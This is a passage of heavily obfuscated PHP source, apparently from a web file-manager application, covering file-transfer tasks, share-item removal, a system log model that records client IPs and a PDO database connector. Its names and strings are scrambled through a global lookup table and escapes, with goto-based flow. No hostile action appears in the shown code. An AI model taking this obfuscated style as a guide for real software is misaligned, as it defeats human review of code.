$ª¤¡Õ[$Î‚í™Œˆ[6]] = json_decode($ª¤¡Õ[$Î‚í™Œˆ[6]], !0); return $ª¤¡Õ; } public function remove($•€É¦¨«) { $this->removeShareItems($•€É¦¨«); return parent::remove($•€É¦¨«); } public function removeWithFile($İï«¤, $¤ğ–û—ä) { $ïÆ¡ÏÖ =& $_SERVER[—ÌÒğš÷]; $®úÊÌò = array($ïÆ¡ÏÖ[853] => $İï«¤); $æ¢©ÍêÆ = Model($ïÆ¡ÏÖ[512])->where($®úÊÌò)->count(); $°ì¤¦ëí = Model($ïÆ¡ÏÖ[512])->where($®úÊÌò)->sum($ïÆ¡ÏÖ[76]); $¥­¥šºş = $¤ğ–û—ä . $ïÆ¡ÏÖ[2219] . $İï«¤; $ï¤Ô«À = LNG($¤ğ–û—ä == $ïÆ¡ÏÖ[588] ? $ïÆ¡ÏÖ[2220] : $ïÆ¡ÏÖ[2221]); $¶åÃ´å = new TaskFileTransfer($¥­¥šºş, $ïÆ¡ÏÖ[2215], $æ¢©ÍêÆ, $ï¤Ô«À . "\x28{$İï«¤}\51"); $¶åÃ´å->task[$ïÆ¡ÏÖ[799]] = (double) $°ì¤¦ëí; $šõÁœÉü = KodIO::defaultDriver(); $ËÓ†öî = $šõÁœÉü[$ïÆ¡ÏÖ[443]]; $ü–â†á† = "\173\x69\157\72{$ËÓ†öî}\x7d\57"; $Ö›İ§è = !0; $°¯ˆàĞ´ = array(); $í˜Üæ¥ = Model($ïÆ¡ÏÖ[214])->where($®úÊÌò)->field($ïÆ¡ÏÖ[2222])->select(); foreach ($í˜Üæ¥ as $¾ùÑö§) { $ìù‹Áƒ = $¾ùÑö§[$ïÆ¡ÏÖ[84]]; $ï´ıÕù˜ = $ü–â†á† . str_replace("\173\151\x6f\72{$İï«¤}\175\x2f", $ïÆ¡ÏÖ[12], $ìù‹Áƒ); if (!IO::exist($ìù‹Áƒ)) { $°¯ˆàĞ´[] = $¾ùÑö§[$ïÆ¡ÏÖ[509]]; $¶åÃ´å->updateFileEnd($¾ùÑö§[$ïÆ¡ÏÖ[32]], $¾ùÑö§[$ïÆ¡ÏÖ[76]]); continue; } if (IO::exist($ï´ıÕù˜)) { $¶åÃ´å->updateFileEnd($¾ùÑö§[$ïÆ¡ÏÖ[32]], $¾ùÑö§[$ïÆ¡ÏÖ[76]]); continue; } if (!IO::move($ìù‹Áƒ, get_path_father($ï´ıÕù˜))) { $Ö›İ§è = !1; break; } $®úÊÌò = array($ïÆ¡ÏÖ[509] => $¾ùÑö§[$ïÆ¡ÏÖ[509]]); $µş¦‰ = array($ïÆ¡ÏÖ[853] => $ËÓ†öî, $ïÆ¡ÏÖ[84] => $ï´ıÕù˜); Model($ïÆ¡ÏÖ[214])->where($®úÊÌò)->save($µş¦‰); } $this->removeByFileID($°¯ˆàĞ´); if (!$Ö›İ§è) { $¶åÃ´å->stop($¥­¥šºş); return !1; } $¶åÃ´å->end(); if ($¤ğ–û—ä == $ïÆ¡ÏÖ[1856]) { $this->remove($İï«¤); } } public function progress($ÊØ…ùˆ’, $„„³¬ÑÉ) { return Task::get($„„³¬ÑÉ . $_SERVER[—ÌÒğš÷][2219] . $ÊØ…ùˆ’); } private function removeByFileID($ üİåé = array()) { $ğ®¤şµƒ =& $_SERVER[—ÌÒğš÷]; if (empty($ üİåé)) { return; } $–¿îÚ¿Ó = array($ğ®¤şµƒ[509] => array($ğ®¤şµƒ[7], $ üİåé)); $Ìï»î…® = Model($ğ®¤şµƒ[1376])->where($–¿îÚ¿Ó)->field($ğ®¤şµƒ[181])->select(); if (!$Ìï»î…®) { return; } $Ìï»î…® = array_to_keyvalue($Ìï»î…®, $ğ®¤şµƒ[12], $ğ®¤şµƒ[181]); foreach ($Ìï»î…® as $ÚËå¬ùç) { Model($ğ®¤şµƒ[458])->removeNow($ÚËå¬ùç, !1); } } private function removeShareItems($ÓúÓíè) { $Åºù© =& $_SERVER[—ÌÒğš÷]; $‡ŠËËòº = "\x7b\x69\x6f\72{$ÓúÓíè}\x7d\57"; $‰š¬«ç = array($Åºù©[181] => 0, $Åºù©[1219] => array($Åºù©[427], "{$‡ŠËËòº}\x25")); $ï­ˆ†Î¯ = Model($Åºù©[1867])->where($‰š¬«ç)->field($Åºù©[633])->select(); if (empty($ï­ˆ†Î¯)) { return; } $œ³ƒš© = array_to_keyvalue($ï­ˆ†Î¯, $Åºù©[12], $Åºù©[633]); Model($Åºù©[632])->remove($œ³ƒš©); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\155\x2e\114\x69\x67\x68\164\101\x70\160"; public $modelType = "\x53\171\163\164\145\155\x4f\x70\x74\x69\x6f\x6e"; public $field = array("\x6e\141\x6d\145", "\147\162\157\165\x70", "\x64\145\163\143", "\143\157\156\164\x65\156\x74"); public function listData($šü¯ä€æ = false, $¤Ğ»óš = "\155\157\144\x69\x66\171\124\151\x6d\145", $ÄºÛö›“ = true) { return parent::listData($šü¯ä€æ, $¤Ğ»óš, $ÄºÛö›“); } public function remove($³Îâéùù) { $°äçÊ³Û = $this->findByName($³Îâéùù); if (!$°äçÊ³Û) { return !1; } return parent::remove($°äçÊ³Û[$_SERVER[—ÌÒğš÷][443]]); } public function add($ÈÆµªÈ) { if ($this->findByName($ÈÆµªÈ[$_SERVER[—ÌÒğš÷][32]])) { return !1; } return parent::insert($ÈÆµªÈ); } public function update($›£–ŠİÀ, $óÀİË¼ê) { $ñƒÅÉÅ¦ =& $_SERVER[—ÌÒğš÷]; $¥ºª‰…Ó = $this->findByName($›£–ŠİÀ); $ûÂ€Ù·ç = $this->findByName($óÀİË¼ê[$ñƒÅÉÅ¦[32]]); if (!$¥ºª‰…Ó || $ûÂ€Ù·ç && $ûÂ€Ù·ç[$ñƒÅÉÅ¦[443]] != $¥ºª‰…Ó[$ñƒÅÉÅ¦[443]]) { return !1; } return parent::update($¥ºª‰…Ó[$ñƒÅÉÅ¦[443]], $óÀİË¼ê); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\171\x73\x74\x65\x6d\x5f\x6c\x6f\x67"; protected $dataAuto = array(array("\143\x72\145\x61\164\145\124\x69\155\x65", "\x74\151\x6d\145", "\151\x6e\x73\145\162\x74", "\146\x75\x6e\x63\x74\x69\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ŸØ´„³Ğ =& $_SERVER[—ÌÒğš÷]; return array($ŸØ´„³Ğ[2223] => LNG($ŸØ´„³Ğ[2224]), $ŸØ´„³Ğ[2225] => LNG($ŸØ´„³Ğ[2226]), $ŸØ´„³Ğ[1830] => LNG($ŸØ´„³Ğ[2227]), $ŸØ´„³Ğ[2228] => LNG($ŸØ´„³Ğ[2229]), $ŸØ´„³Ğ[2230] => LNG($ŸØ´„³Ğ[2231]), $ŸØ´„³Ğ[2232] => LNG($ŸØ´„³Ğ[2233]), $ŸØ´„³Ğ[2234] => LNG($ŸØ´„³Ğ[2235]), $ŸØ´„³Ğ[1860] => LNG($ŸØ´„³Ğ[2235]), $ŸØ´„³Ğ[1861] => LNG($ŸØ´„³Ğ[2236]), $ŸØ´„³Ğ[2237] => LNG($ŸØ´„³Ğ[2238]), $ŸØ´„³Ğ[2239] => LNG($ŸØ´„³Ğ[2240]), $ŸØ´„³Ğ[2241] => LNG($ŸØ´„³Ğ[2242]), $ŸØ´„³Ğ[2243] => LNG($ŸØ´„³Ğ[2244]), $ŸØ´„³Ğ[1858] => LNG($ŸØ´„³Ğ[2245]), $ŸØ´„³Ğ[2246] => LNG($ŸØ´„³Ğ[2247]), $ŸØ´„³Ğ[1865] => LNG($ŸØ´„³Ğ[2248]), $ŸØ´„³Ğ[2249] => LNG($ŸØ´„³Ğ[2250]), $ŸØ´„³Ğ[2251] => LNG($ŸØ´„³Ğ[2252]), $ŸØ´„³Ğ[2253] => LNG($ŸØ´„³Ğ[2254]), $ŸØ´„³Ğ[2255] => LNG($ŸØ´„³Ğ[2256]), $ŸØ´„³Ğ[1868] => LNG($ŸØ´„³Ğ[2257]), $ŸØ´„³Ğ[1869] => LNG($ŸØ´„³Ğ[2258]), $ŸØ´„³Ğ[2259] => LNG($ŸØ´„³Ğ[2260]), $ŸØ´„³Ğ[2261] => LNG($ŸØ´„³Ğ[2262]), $ŸØ´„³Ğ[2263] => LNG($ŸØ´„³Ğ[2264]), $ŸØ´„³Ğ[1863] => LNG($ŸØ´„³Ğ[2265]), $ŸØ´„³Ğ[2266] => LNG($ŸØ´„³Ğ[2267]), $ŸØ´„³Ğ[1862] => LNG($ŸØ´„³Ğ[2268]), $ŸØ´„³Ğ[2269] => LNG($ŸØ´„³Ğ[2270]), $ŸØ´„³Ğ[2271] => LNG($ŸØ´„³Ğ[2272]), $ŸØ´„³Ğ[2273] => LNG($ŸØ´„³Ğ[2274]), $ŸØ´„³Ğ[2275] => LNG($ŸØ´„³Ğ[2275]), $ŸØ´„³Ğ[2276] => LNG($ŸØ´„³Ğ[1834]), $ŸØ´„³Ğ[2277] => LNG($ŸØ´„³Ğ[2278]), $ŸØ´„³Ğ[2279] => LNG($ŸØ´„³Ğ[2280]), $ŸØ´„³Ğ[2281] => LNG($ŸØ´„³Ğ[2282]), $ŸØ´„³Ğ[2283] => LNG($ŸØ´„³Ğ[2284]), $ŸØ´„³Ğ[2285] => LNG($ŸØ´„³Ğ[2286]), $ŸØ´„³Ğ[2287] => LNG($ŸØ´„³Ğ[2287]), $ŸØ´„³Ğ[2288] => LNG($ŸØ´„³Ğ[2289]), $ŸØ´„³Ğ[2290] => LNG($ŸØ´„³Ğ[2291]), $ŸØ´„³Ğ[2292] => LNG($ŸØ´„³Ğ[2293]), $ŸØ´„³Ğ[2294] => LNG($ŸØ´„³Ğ[2295]), $ŸØ´„³Ğ[2296] => LNG($ŸØ´„³Ğ[2297]), $ŸØ´„³Ğ[2298] => LNG($ŸØ´„³Ğ[2299])); } private function typeFile() { $ÙŒØ¯‰å =& $_SERVER[—ÌÒğš÷]; $ËîíÊ = array($ÙŒØ¯‰å[1865] => array($ÙŒØ¯‰å[1866]), $ÙŒØ¯‰å[2241] => array($ÙŒØ¯‰å[2300]), $ÙŒØ¯‰å[2243] => array($ÙŒØ¯‰å[2301]), $ÙŒØ¯‰å[1858] => array($ÙŒØ¯‰å[1859], $ÙŒØ¯‰å[2302]), $ÙŒØ¯‰å[2251] => array(), $ÙŒØ¯‰å[2253] => array(), $ÙŒØ¯‰å[2255] => array(), $ÙŒØ¯‰å[1868] => array($ÙŒØ¯‰å[1870]), $ÙŒØ¯‰å[1869] => array($ÙŒØ¯‰å[1870]), $ÙŒØ¯‰å[2259] => array($ÙŒØ¯‰å[2303]), $ÙŒØ¯‰å[2261] => array($ÙŒØ¯‰å[2303]), $ÙŒØ¯‰å[2263] => array($ÙŒØ¯‰å[2304]), $ÙŒØ¯‰å[2249] => array($ÙŒØ¯‰å[2305]), $ÙŒØ¯‰å[1863] => array($ÙŒØ¯‰å[2306]), $ÙŒØ¯‰å[2266] => array($ÙŒØ¯‰å[2307]), $ÙŒØ¯‰å[1862] => array($ÙŒØ¯‰å[1864])); return $ËîíÊ; } private function typeAll() { $ ‚™ö©± =& $_SERVER[—ÌÒğš÷]; $÷ĞÑ©õ„ = $this->typeList; $Óı¯ã = array_filter($this->typeFile()); foreach ($Óı¯ã as $Šäá¨…” => $æ‰‡”Šà) { $÷ĞÑ©õ„[$æ‰‡”Šà[0]] = $÷ĞÑ©õ„[$Šäá¨…”]; } $÷ĞÑ©õ„[$ ‚™ö©±[1870]] = LNG($ ‚™ö©±[2308]); $÷ĞÑ©õ„[$ ‚™ö©±[2303]] = LNG($ ‚™ö©±[2309]); return $÷ĞÑ©õ„; } public function addLog($›¥ñî¦, $İÅ”±´ = array()) { $¿ŠÌì¯› =& $_SERVER[—ÌÒğš÷]; if (!isset($this->typeList[$›¥ñî¦])) { return; } $¿œ×Ÿ¢ù = isset($İÅ”±´[$¿ŠÌì¯›[1688]]) ? $İÅ”±´[$¿ŠÌì¯›[1688]] : 0; if (!$¿œ×Ÿ¢ù) { $¿œ×Ÿ¢ù = Session::get($¿ŠÌì¯›[2024]); } if ($›¥ñî¦ == $¿ŠÌì¯›[2277] && is_array($İÅ”±´[$¿ŠÌì¯›[2310]]) && !$İÅ”±´[$¿ŠÌì¯›[2310]]) { return; } $Ÿ©”•Šï = get_client_ip(); if (!$İÅ”±´ || strlen(json_encode($İÅ”±´)) >= 1024) { $İÅ”±´ = array($¿ŠÌì¯›[2311] => $Ÿ©”•Šï); } else { if (is_array($İÅ”±´)) { $İÅ”±´[$¿ŠÌì¯›[2311]] = $Ÿ©”•Šï; } else { $İÅ”±´ = array($¿ŠÌì¯›[1246] => $İÅ”±´, $¿ŠÌì¯›[2311] => $Ÿ©”•Šï); } } $İÅ”±´ = array($¿ŠÌì¯›[1678] => Session::sign(), $¿ŠÌì¯›[1679] => intval($¿œ×Ÿ¢ù), $¿ŠÌì¯›[33] => $›¥ñî¦, $¿ŠÌì¯›[1681] => json_encode($İÅ”±´)); parent::add($İÅ”±´); } public function remove($ä¬ØàÌè) { $this->where(array($_SERVER[—ÌÒğš÷][461] => $ä¬ØàÌè))->delete(); } private function _makeOrder($ÊÑÀ­ÕÅ = '') { $ÊÙƒ¿‰ =& $_SERVER[—ÌÒğš÷]; $ÁÚä‰Ü° = $ÊÙƒ¿‰[215]; $®õÀÍ¾€ = array($ÊÙƒ¿‰[491] => $ÊÙƒ¿‰[492], $ÊÙƒ¿‰[493] => $ÊÙƒ¿‰[494]); $³öÖœşô = Input::get($ÊÙƒ¿‰[499], $ÊÙƒ¿‰[7], $ÊÙƒ¿‰[2060], array($ÊÙƒ¿‰[1978], $ÊÙƒ¿‰[493])); $³öÖœşô = $®õÀÍ¾€[$³öÖœşô]; $ÊÑÀ­ÕÅ = $ÊÑÀ­ÕÅ . "{$ÁÚä‰Ü°}\40{$³öÖœşô}"; return $this->order($ÊÑÀ­ÕÅ); } public function get($“Åùõªå = '') { $Œ­ûœùÎ =& $_SERVER[—ÌÒğš÷]; if (!$“Åùõªå) { show_json(array()); } $×™É•°ú = array(); if ($“Åùõªå[$Œ­ûœùÎ[1688]]) { $×™É•°ú[$Œ­ûœùÎ[1688]] = $“Åùõªå[$Œ­ûœùÎ[1688]]; } if (isset($“Åùõªå[$Œ­ûœùÎ[796]])) { $é¤¹¨øÕ = $“Åùõªå[$Œ­ûœùÎ[796]]; $¾Š¾áéó = isset($“Åùõªå[$Œ­ûœùÎ[797]]) ? $“Åùõªå[$Œ­ûœùÎ[797]] : time(); $×™É•°ú[$Œ­ûœùÎ[215]] = array($Œ­ûœùÎ[377], array($é¤¹¨øÕ, $¾Š¾áéó)); } if ($“Åùõªå[$Œ­ûœùÎ[33]]) { $êÖÇ™õ¸ = explode($Œ­ûœùÎ[50], $“Åùõªå[$Œ­ûœùÎ[33]]); $¸É™îô = $this->typeFile(); $š×…‚èœ = array(); foreach ($êÖÇ™õ¸ as $Ùá›÷Üˆ) { $š×…‚èœ[] = $Ùá›÷Üˆ; if (isset($¸É™îô[$Ùá›÷Üˆ])) { $š×…‚èœ = array_merge($š×…‚èœ, $¸É™îô[$Ùá›÷Üˆ]); } } $š×…‚èœ = array_unique($š×…‚èœ); if ($š×…‚èœ) { $×™É•°ú[$Œ­ûœùÎ[33]] = array($Œ­ûœùÎ[7], $š×…‚èœ); } } else { $×™É•°ú[$Œ­ûœùÎ[33]] = array($Œ­ûœùÎ[2312], $Œ­ûœùÎ[2313]); } if (!empty($“Åùõªå[$Œ­ûœùÎ[2311]])) { $×™É•°ú[$Œ­ûœùÎ[494]] = array($Œ­ûœùÎ[427], "\x25{$“Åùõªå[$Œ­ûœùÎ[2311]]}\45"); } $ùíØµ¡‹ = $this->_makeOrder()->where($×™É•°ú)->selectPage(); if (empty($ùíØµ¡‹[$Œ­ûœùÎ[413]])) { show_json(array(), !0, $ùíØµ¡‹[$Œ­ûœùÎ[410]]); } $ùíØµ¡‹[$Œ­ûœùÎ[413]] = $this->logList($ùíØµ¡‹[$Œ­ûœùÎ[413]]); return $ùíØµ¡‹; } private function ipAddress(&$É½ğí±) { $ó¢ƒ€ =& $_SERVER[—ÌÒğš÷]; if (!empty($É½ğí±[$ó¢ƒ€[2311]])) { $«‚êû…À = IpLocation::get($É½ğí±[$ó¢ƒ€[2311]]); } else { $«‚êû…À = LNG($ó¢ƒ€[2314]); } $É½ğí±[$ó¢ƒ€[2315]] = $«‚êû…À; } private function descZipDownload($â³•áÂ, &$Øæ¸®Üó) { $ ½¯õâ =& $_SERVER[—ÌÒğš÷]; if (!isset($â³•áÂ[$ ½¯õâ[2316]])) { return; } $‰°Ï´©Ş = json_decode($â³•áÂ[$ ½¯õâ[2316]], !0); foreach ($‰°Ï´©Ş as $îŒúÏ–­) { try { $§»×šï¯ = IO::infoFullSimple($îŒúÏ–­[$ ½¯õâ[84]]); } catch (Exception $Æ¤­½Ä) { continue; } $â³•áÂ[$ ½¯õâ[84]] = $îŒúÏ–­[$ ½¯õâ[84]]; $Øæ¸®Üó[] = $â³•áÂ[$ ½¯õâ[181]] = $§»×šï¯[$ ½¯õâ[181]]; $Øæ¸®Üó[] = $â³•áÂ[$ ½¯õâ[2115]] = $§»×šï¯[$ ½¯õâ[180]]; break; } return $â³•áÂ; } private function getSourceList(&$°ë×õâº) { $ëã é–” =& $_SERVER[—ÌÒğš÷]; $í»¦Ê˜® = array(); foreach ($°ë×õâº as $Ë‚ÅØ¾ô => $Œ°äÁ) { $ñ¿¶²ıÅ = json_decode($Œ°äÁ[$ëã é–”[494]], !0); if ($Œ°äÁ[$ëã é–”[33]] == $ëã é–”[1861]) { $ñ¿¶²ıÅ = $this->descZipDownload($ñ¿¶²ıÅ, $í»¦Ê˜®); $°ë×õâº[$Ë‚ÅØ¾ô][$ëã é–”[494]] = json_encode($ñ¿¶²ıÅ); continue; } if (strpos($Œ°äÁ[$ëã é–”[33]], $ëã é–”[2117]) !== 0) { if (!isset($ñ¿¶²ıÅ[$ëã é–”[84]]) || strpos($Œ°äÁ[$ëã é–”[33]], $ëã é–”[2317]) !== 0) { continue; } try { $Û…„‹¥ç = IO::infoFullSimple($ñ¿¶²ıÅ[$ëã é–”[84]]); } catch (Exception $£¦Îã¶õ) { continue; } $í»¦Ê˜®[] = $ñ¿¶²ıÅ[$ëã é–”[181]] = $Û…„‹¥ç[$ëã é–”[181]]; $í»¦Ê˜®[] = $ñ¿¶²ıÅ[$ëã é–”[2115]] = $Û…„‹¥ç[$ëã é–”[180]]; $°ë×õâº[$Ë‚ÅØ¾ô][$ëã é–”[494]] = json_encode($ñ¿¶²ıÅ); continue; } $í»¦Ê˜®[] = $ñ¿¶²ıÅ[$ëã é–”[181]]; $í»¦Ê˜®[] = $ñ¿¶²ıÅ[$ëã é–”[2115]]; if ($ñ¿¶²ıÅ[$ëã é–”[33]] == $ëã é–”[588]) { $í»¦Ê˜®[] = $ñ¿¶²ıÅ[$ëã é–”[494]][$ëã é–”[1204]]; $í»¦Ê˜®[] = $ñ¿¶²ıÅ[$ëã é–”[494]][$ëã é–”[1205]]; } if ($ñ¿¶²ıÅ[$ëã é–”[33]] == $ëã é–”[2125]) { $í»¦Ê˜®[] = $ñ¿¶²ıÅ[$ëã é–”[494]][$ëã é–”[181]]; } } if (!$í»¦Ê˜®) { return array(); } return Model($ëã é–”[861])->sourceListInfo($í»¦Ê˜®, !0); } private function logList($Ğ­”´èæ) { $€¼ÚÂ©Ã =& $_SERVER[—ÌÒğš÷]; $‰Ôá‰“  = array_to_keyvalue($Ğ­”´èæ, $€¼ÚÂ©Ã[12], $€¼ÚÂ©Ã[1688]); $™¨æ°å„ = Model($€¼ÚÂ©Ã[567])->userListInfo(array_unique($‰Ôá‰“ )); $ÎÓÁØˆ = $this->getSourceList($Ğ­”´èæ); $ãÇÌ¶²İ = $this->typeAll(); $áÎèœ³‹ = array(); $Òæ©ıË˜ = array(); foreach ($Ğ­”´èæ as $Ûœ€…ß¦ => $ßôœ„ÏÌ) { $ğÎûÅªè = $ßôœ„ÏÌ[$€¼ÚÂ©Ã[33]]; $şê¹§‡ = isset($™¨æ°å„[$ßôœ„ÏÌ[$€¼ÚÂ©Ã[1688]]]) ? $™¨æ°å„[$ßôœ„ÏÌ[$€¼ÚÂ©Ã[1688]]] : !1; $î¢›¶£É = strpos($ğÎûÅªè, $€¼ÚÂ©Ã[2318]) === 0 ? LNG($€¼ÚÂ©Ã[2319]) : LNG($€¼ÚÂ©Ã[2314]); $ßôœ„ÏÌ[$€¼ÚÂ©Ã[32]] = isset($şê¹§‡[$€¼ÚÂ©Ã[32]]) ? $şê¹§‡[$€¼ÚÂ©Ã[32]] : LNG($€¼ÚÂ©Ã[2314]); $ßôœ„ÏÌ[$€¼ÚÂ©Ã[2169]] = isset($şê¹§‡[$€¼ÚÂ©Ã[2169]]) ? $şê¹§‡[$€¼ÚÂ©Ã[2169]] : $€¼ÚÂ©Ã[12]; $ßôœ„ÏÌ[$€¼ÚÂ©Ã[1585]] = isset($ãÇÌ¶²İ[$ğÎûÅªè]) ? $ãÇÌ¶²İ[$ğÎûÅªè] : $î¢›¶£É; $ßôœ„ÏÌ[$€¼ÚÂ©Ã[2059]] = $şê¹§‡; $ğË–Í½” = json_decode($ßôœ„ÏÌ[$€¼ÚÂ©Ã[494]], !0); $ßôœ„ÏÌ[$€¼ÚÂ©Ã[2311]] = isset($ğË–Í½”[$€¼ÚÂ©Ã[2311]]) ? $ğË–Í½”[$€¼ÚÂ©Ã[2311]] : $€¼ÚÂ©Ã[12]; $ßôœ„ÏÌ[$€¼ÚÂ©Ã[2315]] = IpLocation::get($ßôœ„ÏÌ[$€¼ÚÂ©Ã[2311]]); if (strpos($ğÎûÅªè, $€¼ÚÂ©Ã[2117]) === 0 || isset($ğË–Í½”[$€¼ÚÂ©Ã[2115]])) { $ğË–Í½”[$€¼ÚÂ©Ã[87]] = $ÎÓÁØˆ[$ğË–Í½”[$€¼ÚÂ©Ã[181]]]; $ğË–Í½”[$€¼ÚÂ©Ã[2130]] = $ÎÓÁØˆ[$ğË–Í½”[$€¼ÚÂ©Ã[2115]]]; if ($ğË–Í½”[$€¼ÚÂ©Ã[33]] == $€¼ÚÂ©Ã[588]) { $ğË–Í½”[$€¼ÚÂ©Ã[494]][$€¼ÚÂ©Ã[1204]] = $ÎÓÁØˆ[$ğË–Í½”[$€¼ÚÂ©Ã[494]][$€¼ÚÂ©Ã[1204]]]; $ğË–Í½”[$€¼ÚÂ©Ã[494]][$€¼ÚÂ©Ã[1205]] = $ÎÓÁØˆ[$ğË–Í½”[$€¼ÚÂ©Ã[494]][$€¼ÚÂ©Ã[1205]]]; } if ($ğË–Í½”[$€¼ÚÂ©Ã[33]] == $€¼ÚÂ©Ã[2125]) { $ğË–Í½”[$€¼ÚÂ©Ã[494]][$€¼ÚÂ©Ã[181]] = $ÎÓÁØˆ[$ğË–Í½”[$€¼ÚÂ©Ã[494]][$€¼ÚÂ©Ã[181]]]; } if ($ğË–Í½”[$€¼ÚÂ©Ã[33]] == $€¼ÚÂ©Ã[1856]) { $ğË–Í½”[$€¼ÚÂ©Ã[2130]] = $ğË–Í½”[$€¼ÚÂ©Ã[87]]; $ğË–Í½”[$€¼ÚÂ©Ã[2115]] = $ğË–Í½”[$€¼ÚÂ©Ã[2130]][$€¼ÚÂ©Ã[181]]; $ğË–Í½”[$€¼ÚÂ©Ã[87]] = !1; $ğË–Í½”[$€¼ÚÂ©Ã[181]] = $€¼ÚÂ©Ã[12]; } if ($ğË–Í½”[$€¼ÚÂ©Ã[87]] && $ğË–Í½”[$€¼ÚÂ©Ã[87]][$€¼ÚÂ©Ã[178]] == $€¼ÚÂ©Ã[179]) { $Òæ©ıË˜[] = $ßôœ„ÏÌ[$€¼ÚÂ©Ã[443]]; unset($Ğ­”´èæ[$Ûœ€…ß¦]); continue; } if ($ğË–Í½”[$€¼ÚÂ©Ã[2130]] && $ğË–Í½”[$€¼ÚÂ©Ã[2130]][$€¼ÚÂ©Ã[178]] == $€¼ÚÂ©Ã[179]) { $Òæ©ıË˜[] = $ßôœ„ÏÌ[$€¼ÚÂ©Ã[443]]; unset($Ğ­”´èæ[$Ûœ€…ß¦]); continue; } } $ßôœ„ÏÌ[$€¼ÚÂ©Ã[494]] = $ğË–Í½”; unset($ßôœ„ÏÌ[$€¼ÚÂ©Ã[2320]]); $áÎèœ³‹[] = $ßôœ„ÏÌ; } $this->clearSystemPathLog($Òæ©ıË˜); return $áÎèœ³‹; } private function clearSystemPathLog($ëËœ‘Ÿ) { $ÖÅ—ğÍ€ =& $_SERVER[—ÌÒğš÷]; if (count($ëËœ‘Ÿ) == 0) { return; } $Ğ½¾Ş‹ = array($ÖÅ—ğÍ€[443] => array($ÖÅ—ğÍ€[7], array_unique($ëËœ‘Ÿ))); $this->where($Ğ½¾Ş‹)->delete(); } public function deviceList($Àõ„ãÊ, $‘Öşïèä = 0) { $ÛŒÜÁ˜ =& $_SERVER[—ÌÒğš÷]; $¡è“§¨å = array($ÛŒÜÁ˜[1688] => $Àõ„ãÊ, $ÛŒÜÁ˜[215] => array($ÛŒÜÁ˜[1058], $‘Öşïèä), $ÛŒÜÁ˜[33] => $ÛŒÜÁ˜[1830]); $Àœ¤ªŞ‘ = array(); $éâ‹Ş‡Ñ = $this->field($ÛŒÜÁ˜[2321])->where($¡è“§¨å)->order($ÛŒÜÁ˜[2128])->limit(50)->select(); foreach ($éâ‹Ş‡Ñ as $‹ì¦êìÂ => $»éÓ„áŞ) { if ($‹ì¦êìÂ > 0 && abs($»éÓ„áŞ[$ÛŒÜÁ˜[215]] - $éâ‹Ş‡Ñ[$‹ì¦êìÂ - 1][$ÛŒÜÁ˜[215]]) < 5) { continue; } $ŞÉûÇ‹õ = json_decode($»éÓ„áŞ[$ÛŒÜÁ˜[494]], !0); $»éÓ„áŞ[$ÛŒÜÁ˜[2311]] = isset($ŞÉûÇ‹õ[$ÛŒÜÁ˜[2311]]) ? $ŞÉûÇ‹õ[$ÛŒÜÁ˜[2311]] : $ÛŒÜÁ˜[12]; unset($ŞÉûÇ‹õ[$ÛŒÜÁ˜[2311]]); $ü¤“ì¿Ì = $this->deviceType($ŞÉûÇ‹õ[$ÛŒÜÁ˜[2118]]); if (isset($Àœ¤ªŞ‘[$ü¤“ì¿Ì])) { continue; } $»éÓ„áŞ[$ÛŒÜÁ˜[2315]] = IpLocation::get($»éÓ„áŞ[$ÛŒÜÁ˜[2311]]); $»éÓ„áŞ[$ÛŒÜÁ˜[494]] = $ŞÉûÇ‹õ; $Àœ¤ªŞ‘[$ü¤“ì¿Ì] = $»éÓ„áŞ; } return array_values($Àœ¤ªŞ‘); } public function deviceType($æ—ë¹) { return $æ—ë¹; } } goto DïÃ•¶‘Ó°; DŠå†‹õ»: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($‰¢¨†îÉ = '') { $ø£­‰È¬ =& $_SERVER[—ÌÒğš÷]; if (!class_exists($ø£­‰È¬[958])) { think_exception(think_lang($ø£­‰È¬[14]) . $ø£­‰È¬[959]); } if (!empty($‰¢¨†îÉ)) { $this->config = $‰¢¨†îÉ; if (empty($this->config[$ø£­‰È¬[17]])) { $this->config[$ø£­‰È¬[17]] = array(); } } } public function connect($Ğ±ºÁ = '', $Ú¢ë¿Ü× = 0) { $Ûå§ÜÄ =& $_SERVER[—ÌÒğš÷]; if (!isset($this->linkID[$Ú¢ë¿Ü×])) { if (empty($Ğ±ºÁ)) { $Ğ±ºÁ = $this->config; } $Ÿ–Œˆïá = !empty($Ğ±ºÁ[$Ûå§ÜÄ[17]][$Ûå§ÜÄ[18]]) ? $Ğ±ºÁ[$Ûå§ÜÄ[17]][$Ûå§ÜÄ[18]] : $this->pconnect; if ($Ÿ–Œˆïá) { $Ğ±ºÁ[$Ûå§ÜÄ[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$Ú¢ë¿Ü×] = new PDO($Ğ±ºÁ[$Ûå§ÜÄ[960]], $Ğ±ºÁ[$Ûå§ÜÄ[932]], $Ğ±ºÁ[$Ûå§ÜÄ[933]], $Ğ±ºÁ[$Ûå§ÜÄ[17]]); } catch (PDOException $üïÎ‚ˆ) { think_exception($üïÎ‚ˆ->getMessage()); } $this->dbType = $this->_getDsnType($Ğ±ºÁ[$Ûå§ÜÄ[960]]); if (in_array($this->dbType, array($Ûå§ÜÄ[961], $Ûå§ÜÄ[962], $Ûå§ÜÄ[963], $Ûå§ÜÄ[964]))) { think_exception($Ûå§ÜÄ[965] . $this->dbType . $Ûå§ÜÄ[966] . $this->dbType . $Ûå§ÜÄ[967]); } if (!$this->linkID[$Ú¢ë¿Ü×]) { think_exception($Ûå§ÜÄ[968]); } try { $this->linkID[$Ú¢ë¿Ü×]->exec($Ûå§ÜÄ[969] . think_config($Ûå§ÜÄ[935])); } catch (Exception $üïÎ‚ˆ) { } $this->connected = !0; if (1 != think_config($Ûå§ÜÄ[22])) { unset($this->config); } } return $this->linkID[$Ú¢ë¿Ü×]; } public function free() { $this->PDOStatement = null; } public function query($ËÉŞ²®õ, $¨ÎÊ¥è = array()) { $Ê¹ÈøÑ« =& $_SERVER[—ÌÒğš÷]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ËÉŞ²®õ; if (!empty($¨ÎÊ¥è)) { $this->queryStr .= $Ê¹ÈøÑ«[970] . print_r($¨ÎÊ¥è, !0) . $Ê¹ÈøÑ«[971]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Ê¹ÈøÑ«[23], 1); think_status($Ê¹ÈøÑ«[24]); $this->PDOStatement = 